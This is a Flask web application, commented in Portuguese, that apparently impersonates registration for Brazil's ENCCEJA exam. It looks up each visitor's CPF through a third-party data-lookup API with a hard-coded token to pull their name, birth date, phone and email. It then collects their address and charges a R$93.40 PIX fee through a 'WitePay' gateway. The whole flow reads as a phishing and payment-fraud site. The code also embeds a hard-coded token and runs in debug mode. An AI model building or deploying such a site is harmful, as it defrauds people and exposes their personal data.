from flask import Flask, render_template, request, session, redirect, url_for, jsonify
import os
import logging
import requests
import re
from dotenv import load_dotenv

# Carregar variáveis de ambiente
load_dotenv()

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "encceja_secret_2025")

# Configurar logging
logging.basicConfig(level=logging.INFO)

def consultar_cpf_api(cpf: str) -> dict:
    """
    Consulta CPF na API externa
    """
    try:
        # API de consulta CPF
        url = f"https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}"
        
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            if data.get('sucesso'):
                app.logger.info(f"[PROD] CPF consultado com sucesso na API: {cpf}")
                return {
                    'sucesso': True,
                    'nome': data.get('nome', ''),
                    'cpf': cpf,
                    'situacao': data.get('situacaoCadastral', 'REGULAR'),
                    'data_nascimento': data.get('dataNascimento', ''),
                    'telefone': data.get('telefone', ''),
                    'email': data.get('email', '')
                }
            else:
                app.logger.warning(f"[PROD] CPF não encontrado na API: {cpf}")
                return {'sucesso': False, 'erro': 'CPF não encontrado'}
        
        app.logger.error(f"[PROD] Erro HTTP na API de CPF: {response.status_code}")
        return {'sucesso': False, 'erro': 'Erro na consulta'}
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao consultar CPF: {e}")
        return {'sucesso': False, 'erro': 'Erro interno'}

@app.route('/')
def index():
    """Página principal - redireciona para /inscricao"""
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
def inscricao():
    """Página principal de inscrição ENCCEJA"""
    user_data = session.get('user_data', {'nome': '', 'cpf': '', 'phone': ''})
    app.logger.info(f"[PROD] Renderizando página de inscrição para: {user_data}")
    
    return render_template('inscricao.html', user_data=user_data)

@app.route('/consultar-cpf', methods=['POST'])
def consultar_cpf():
    """API para consultar CPF"""
    try:
        cpf = request.form.get('cpf', '').replace('.', '').replace('-', '').replace(' ', '')
        
        if not cpf or len(cpf) != 11:
            return jsonify({
                'sucesso': False,
                'erro': 'CPF inválido'
            })
        
        # Consultar na API
        resultado = consultar_cpf_api(cpf)
        
        if resultado.get('sucesso'):
            # Salvar dados na sessão
            session['user_data'] = resultado
            
        return jsonify(resultado)
        
    except Exception as e:
        app.logger.error(f"Erro ao processar consulta CPF: {e}")
        return jsonify({
            'sucesso': False,
            'erro': 'Erro interno do servidor'
        })

@app.route('/encceja-info', methods=['GET', 'POST'])
def encceja_info():
    """Página de dados encontrados"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('sucesso'):
        return redirect(url_for('inscricao'))
    
    return render_template('encceja_info.html', user_data=user_data)

@app.route('/validar-dados', methods=['GET', 'POST'])
def validar_dados():
    """Página de validação de dados"""
    user_data = session.get('user_data', {})
    
    if request.method == 'POST':
        # Atualizar dados do usuário
        user_data.update({
            'telefone': request.form.get('telefone', ''),
            'email': request.form.get('email', ''),
            'endereco': request.form.get('endereco', ''),
            'cidade': request.form.get('cidade', ''),
            'estado': request.form.get('estado', '')
        })
        session['user_data'] = user_data
        return redirect(url_for('pagamento'))
    
    return render_template('validar_dados.html', user_data=user_data)

@app.route('/pagamento')
def pagamento():
    """Página de pagamento PIX"""
    user_data = session.get('user_data', {})
    
    if not user_data.get('cpf'):
        return redirect(url_for('inscricao'))
    
    return render_template('pagamento.html', user_data=user_data)

@app.route('/criar-pagamento-pix', methods=['POST'])
def criar_pagamento_pix():
    """Criar pagamento PIX via WitePay"""
    try:
        from witepay_gateway import create_witepay_payment
        
        amount = 93.40
        result = create_witepay_payment(amount, "Inscrição ENCCEJA 2025")
        
        if result.get('success'):
            session['payment_data'] = result
            return jsonify({
                'success': True,
                'transaction_id': result.get('transaction_id'),
                'pix_code': result.get('pix_code'),
                'qr_code': result.get('qr_code'),
                'amount': result.get('amount')
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Erro ao gerar pagamento PIX'
            })
    
    except Exception as e:
        app.logger.error(f"Erro ao criar pagamento: {e}")
        return jsonify({
            'success': False,
            'error': 'Erro interno do servidor'
        })

@app.route('/verificar-pagamento/<transaction_id>')
def verificar_pagamento(transaction_id):
    """Verificar status do pagamento"""
    try:
        from witepay_gateway import check_payment_status
        
        result = check_payment_status(transaction_id)
        return jsonify(result)
    
    except Exception as e:
        app.logger.error(f"Erro ao verificar pagamento: {e}")
        return jsonify({
            'status': 'pending',
            'paid': False
        })

@app.route('/witepay-postback', methods=['POST'])
def witepay_postback():
    """Receber notificações do WitePay"""
    try:
        data = request.get_json()
        app.logger.info(f"Postback recebido: {data}")
        
        # Processar postback
        status = data.get('status', '').upper()
        if status in ['PAID', 'COMPLETED', 'APPROVED']:
            app.logger.info("Pagamento confirmado via postback")
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        app.logger.error(f"Erro no postback: {e}")
        return jsonify({'status': 'error'})

@app.route('/obrigado')
def obrigado():
    """Página de agradecimento"""
    return render_template('inscricao_sucesso.html')

# Rotas adicionais para compatibilidade
@app.route('/index')
def index_redirect():
    return redirect(url_for('inscricao'))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)